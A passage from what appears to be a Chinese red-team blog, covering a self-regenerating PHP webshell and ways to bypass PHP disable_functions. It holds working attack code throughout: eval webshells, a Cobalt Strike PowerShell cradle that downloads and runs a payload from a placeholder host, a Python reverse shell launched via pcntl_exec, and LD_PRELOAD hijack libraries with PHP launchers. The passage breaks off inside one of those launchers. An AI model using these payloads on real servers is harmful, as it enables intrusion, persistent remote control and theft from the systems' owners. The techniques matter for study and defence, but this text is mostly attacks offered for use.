class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断是否存在，不存在就会一直生成一个test.php的文件，当然这个php文件是没有实现无文件落地，如果需要实现还需要添加代码</p><pre><code>@unlink(__FILE__)</code></pre><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>首先我放在了我的www目录里面，去访问一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013181718869.png" alt="image-20211013181718869"></p><p>本地已经生成了test.php，当我们删除这个test.php，然后等待5秒，就有会在当前目录生成一个test.php文件</p><h2 id="蚁剑插件尝试"><a href="#蚁剑插件尝试" class="headerlink" title="蚁剑插件尝试"></a>蚁剑插件尝试</h2><p>蚁剑的插件市场就有php的不死马，尝试利用</p><p>1.首先在获得webshell</p><p>2.打开插件的不死马</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013214808955.png" alt="image-20211013214808955"></p><p>3.前提在当前文件下创建一个xx.txt文件</p><p>文件内容：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'./1.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然可以换别的命令。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013221154686.png" alt="image-20211013221154686"></p><p>4.输入</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013223040392.png" alt="image-20211013223040392"></p><p>输入<a href="http://xx.xx.xx.xx/1.txt###5" target="_blank" rel="noopener">http://xx.xx.xx.xx/1.txt###5</a>    具体内容就是  1.txt是我刚才创建的，5就是多少时间执行一次</p><p>5.确定完了之后就可以看到生成了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013223304924.png" alt="image-20211013223304924"></p><p>看到使用cs上线了，这尝试一下如何使用cs去上线。之前没有做过利用php去上线，碰到一点小问题，还好摸索解决了</p><p>正常来讲，这是cs上线的powershell的方式</p><pre class="line-numbers language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://xx.xx.x.xx:80/b'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再来看看php当中单引号，双引号，反斜杠\的概念</p><p>双引号是可以解析里面的变量，而单引号是不能解析的，\就是转义：去除PHP赋予某些字符的特殊含义</p><p>在很多代码里面都会对里面的内容进行单引号或者双引号的包裹，但是单引号双引号一多就容易犯糊涂。</p><pre><code>echo 'i'm ok';  //比如这段代码</code></pre><p>正常来讲，我们是想输出i’m ok  但是如果不加反斜杠 那么代码就变成</p><pre><code>'i'm ok'  前面一个单引号就跟m前面的单引号闭合了，那么就会造成报错那么就需要加一个反斜杠'i\'m ok'  那么出来就是i'm ok</code></pre><p>同理如果在变量面前加\ 那么这个变量也不会解析的</p><pre><code>$a = 5echo "\$a=".$a 结果就是$a=5  </code></pre><p>再回来看看我们的powershell代码也是一样的效果</p><pre><code>system('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.x.xx:80/b'))"')</code></pre><p>像上面的这个代码就会报错，因为双引号里面还有单引号，而这个单引号是我们想要放在里面的，那么就需要转义添加个\就行了</p><pre><code>system('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://xx.xx.x.xx:80/b\'))"')</code></pre><h3 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h3><p>那么同理，利用蚁剑的插件就可以不停的上线cs了，但是实战当中这样利用肯定不行，流量太多，一下子就发现了。</p><p>1.txt的内容</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014153917216.png" alt="image-20211014153917216"></p><p>生成的1.php的内容</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014153949659.png" alt="image-20211014153949659"></p><p>最后访问1.php上线成功</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014153841664.png" alt="image-20211014153841664"></p><p>现实当中如果遇到这种，建议直接重启，kill进程，条件竞争这不太实用</p><p>总的来说就是：我们通过ash传递参数只要传递的md5值跟后面的一样就会把一句话木马写入我们的文件，通过不断生成文件在当前目录下，形成了不死马，不死马是一个进程，所以往往要重启主机或重启服务才能kill掉。</p><p>参考链接：</p><p><a href="https://mp.weixin.qq.com/s/U-OtSm-bSO-IiF1eKuSmfg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/U-OtSm-bSO-IiF1eKuSmfg</a></p><p><a href="https://www.dazhuanlan.com/poypure/topics/1122369" target="_blank" rel="noopener">https://www.dazhuanlan.com/poypure/topics/1122369</a></p><p><a href="http://vfree.ltd/index.php/archives/76/" target="_blank" rel="noopener">http://vfree.ltd/index.php/archives/76/</a></p><p><a href="https://copyfuture.com/blogs-details/20200817113644488r5wnmrdmqse0kmt" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200817113644488r5wnmrdmqse0kmt</a></p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过disable_functions</title>
      <link href="/posts/c927.html"/>
      <url>/posts/c927.html</url>
      
        <content type="html"><![CDATA[<h1 id="Bypass-disable-functions的方法"><a href="#Bypass-disable-functions的方法" class="headerlink" title="Bypass disable_functions的方法"></a>Bypass disable_functions的方法</h1><h3 id="前提背景"><a href="#前提背景" class="headerlink" title="#前提背景"></a>#前提背景</h3><p>什么是disable_functions:是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p><p>打开我phpstudy启动的服务，因为我没有设置过php.ini，所以我的disable_functions是空的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003110917282.png" alt="image-20211003110917282"></p><p>再来看看什么是php.ini：最直接影响PHP 功能的配置文件   。那么自然而言我们就可以在php.ini里面设置禁用一些函数来看看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003111416409.png" alt="image-20211003111416409"></p><p>注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。详细的eval与assert这个我会在命令执行里面提到</p><p>禁用这4个来看看phpinfo里面的效果(别忘了重启服务)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003111755116.png" alt="image-20211003111755116"></p><p>可以看到，但是当我们上传webshell的时候，却因为disable_functions而无法执行里面的命令，那么我们就需要去绕过</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003114008625.png" alt="image-20211003114008625"></p><p>直接就上传不了，当然</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193257373.png" alt="image-20211006193257373"></p><p>出现ret=127也是函数被禁用的原因了</p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>黑名单顾名思义就是找到不在它禁用的范围里面</p><p>函数有很多</p><pre><code>system,assert,passthru,exec,pcntl_exec,shell_exec,popen,proc_open...等等</code></pre><p>详细的可以看我写的命令执行和代码执行的一些函数</p><p>比如system</p><pre><code>    &lt;?php    highlight_file(__FILE__);    system('dir');    system('whoami');    ?&gt;</code></pre><p>被禁用后</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003115633534.png" alt="image-20211003115633534"></p><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><p>利用条件:需要开启pcntl扩展(可以在phpinfo上面搜索pcntl，如果有单独的说明开了这个模块)</p><p>安装扩展的方法：<a href="https://www.zixuephp.net/article-429.html" target="_blank" rel="noopener">https://www.zixuephp.net/article-429.html</a></p><p>pcntl_exec()是pcntl（linux下面的一个扩展）插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p><p>存在扩展的情况</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003175633489.png" alt="image-20211003175633489"></p><pre><code>#exec.php&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/123.sh”));?&gt;#/tmp/123.sh#!/bin/bashls -l /</code></pre><p>这个pcntl_exec就去执行/tmp目录下的123.sh</p><p>但是pcntl_exec是没有回显的，我们就可以利用它去执行反弹shell</p><pre><code>&lt;?php pcntl_exec("/usr/bin/python3",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));</code></pre><p><a href="https://whoamianony.top/2020/12/21/CTF比赛记录/第四届“蓝帽杯”全国大学生网络安全技能大赛决赛WriteUp/#php" target="_blank" rel="noopener">[第四届“蓝帽杯”决赛]php</a> 这道题利用的就是这个点</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><pre><code>    &lt;?php    highlight_file(__FILE__);    $command = $_GET['cmd']    passthru($command); //直接输出结果    ?&gt;</code></pre><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><pre><code>&lt;?phphighlight_file(__FILE__);$command=$_GET['command'];$fd = popen($command, 'r'); while($s=fgets($fd)){    print_r($s);}?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003194559929.png" alt="image-20211003194559929"></p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><pre><code>&lt;?php    highlight_file(__FILE__);    $command=$_GET['command'];    $descriptorspec=array(         0=&gt;array('pipe','r'),         1=&gt;array('pipe','w'),        2=&gt;array('pipe','w')     );    $handle=proc_open($command,$descriptorspec,$pipes,NULL);    if(!is_resource($handle)){        die('proc_open failed');    }    while($s=fgets($pipes[1])){        print_r($s);    }    while($s=fgets($pipes[2])){        print_r($s);    }    fclose($pipes[0]);    fclose($pipes[1]);    fclose($pipes[2]);    proc_close($handle);?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003194806934.png" alt="image-20211003194806934"></p><h4 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件</h4><p>这个需要添加扩展才行（PHP&gt;5.4），找到php.ini文件，添加extension=php_com_dotnet.dll，php_com_dotnet 只在 window 系统中有效</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003224707326.png" alt="image-20211003224707326"></p><p>phpstudy里面也可以添加</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003200306260.png" alt="image-20211003200306260"></p><p>打开phpinfo</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003225300468.png" alt="image-20211003225300468"></p><p>enable之后，就可以使用如下脚本了</p><p>ps:在这卡了2个多小时，之前phpstudy2017问题，没有指定dll文件，安装后也不行一直报错，后来换了小皮的phpstudy发现也不行，一直磨啊磨，后来才发现是单词拼错了，太菜了……</p><pre><code>&lt;?phphighlight_file(__FILE__);$command=$_GET['cmd'];$wsh = new COM('WScript.shell'); //// 生成一个COM对象　Shell.Application也能$exec = $wsh-&gt;exec("cmd /c ".$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003225637972.png" alt="image-20211003225637972"></p><p>总结：disable_funtions总有限制不全的时候，多观察哪些没有被限制，从而去利用</p><h3 id="利用Linux环境变量LD-PRELOAD"><a href="#利用Linux环境变量LD-PRELOAD" class="headerlink" title="利用Linux环境变量LD_PRELOAD"></a>利用Linux环境变量LD_PRELOAD</h3><p>原理：</p><p><code>**LD_PRELOAD**</code> 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它可以在用户的程序运行前优先加载该动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，可以利用此功能来使用自定义的函数，而另一方面，可以向别人的程序注入程序，从而达到特定的攻击目的</p><p>总的来说：这个函数指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果，并且劫持系统函数，从而达到不调用php命令执行函数，仍然可以执行系统命令。</p><p>在Linux中，动态链接库的后缀名通常用.so 表示；在Windows系统中，动态链接库的后缀名为.dll</p><p>前提条件：</p><ul><li>需要能上传.so的文件 (so文件就是常说的动态链接库)</li><li>能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv，mail函数</li><li>因为新进程启动将加载 <code>LD_PRELOAD</code> 中的 <code>.so</code> 文件，所以要存在可以控制 PHP 启动外部程序的函数并能执行，比如 <code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code> 和 <code>error_log()</code> 函数等,也就是说能够调用动态链接库</li></ul><h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><p>结合例子来理解这个怎么做到劫持：</p><p>在下面的例子之前如果对共享库不理解可以看看这篇</p><p><a href="https://cloud.tencent.com/developer/article/1683012" target="_blank" rel="noopener">Linux共享库、静态库、动态库详解</a></p><p>首先我们自己创建一个生成随机10个数的代码</p><p>random.c </p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先编译运行一下看看效果</p><pre><code>gcc random.c -o random</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004135639016.png" alt="image-20211004135639016"></p><p>接着再去编一个，只返回66数值  随便去一个random1.c</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">66</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候把他们编译成动态共享库</p><pre><code>gcc -shared -fPIC random1.c  -o random1.so  </code></pre><p><a href="https://blog.csdn.net/itworld123/article/details/117587091?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link" target="_blank" rel="noopener">对于-fPIC的理解</a>  我的简单理解就是实现真正意义上的共享吧</p><pre><code>export LD_PRELOAD="./random1.so"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004141353031.png" alt="image-20211004141353031"></p><p>再来ldd看看先后顺序</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004141542678.png" alt="image-20211004141542678"></p><p>可以看到程序执行的时候优先执行了我们动态链接库，实现了劫持的功能</p><h4 id="劫持getuid"><a href="#劫持getuid" class="headerlink" title="劫持getuid()"></a>劫持getuid()</h4><p>原理:</p><p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。那么我们在利用LD_PRELOAD环境变量去劫持getuid(),再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了</p><p>攻击前提：在Linux中已安装并启用sendmail程序。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004160745506.png" alt="image-20211004160745506"></p><p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数（mail）</p><p>因为我们用的是getuid的函数，可以查看一下</p><pre><code>readelf -Ws /usr/sbin/sendmail | grep "getuid"</code></pre><p>创建test.c (获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由system函数获取的系统命令)</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当共享库里面的getuid函数被调用了，那么就会去执行system函数</p><p>接着编译一下</p><pre><code>gcc -c -fPIC test.c -o exp&amp;&amp;gcc -shared exp -o exp.so</code></pre><p>把.so文件上传到服务器，并且写一个webshell  </p><p>test.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p>";</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>     <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cmd是我们要执行的参数，outpath输出的路径，sopath是我们的动态链接库</p><p>哎。。又磨了一下午没磨出来</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004163842159.png" alt="image-20211004163842159"></p><p>一直显示500.sendmail也安装了，访问路径下别的都行，就是这个php不行,等有空再钻研一下</p><p>但是方法就是那么一个方法，有师傅成功了教教我。</p><p>缺点：因为所学的知识都是用于真实的环境，所以在真实环境中有两点</p><p>1.某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；</p><p>2.即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1  lamp、lamp.、lamp.com）</p><h4 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h4><p>为了不去尝试sendmail这个，GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数，</p><p>bypass_disablefunc.c</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// get command line options and arg</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// unset environment variable LD_PRELOAD.</span>    <span class="token comment" spellcheck="true">// unsetenv("LD_PRELOAD") no effect on some </span>    <span class="token comment" spellcheck="true">// distribution (e.g., centos), I need crafty trick.</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// executive command</span>    <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bypass_disablefunc.php  这个跟上面的test.php一样</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p>";</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$so_path</span> <span class="token 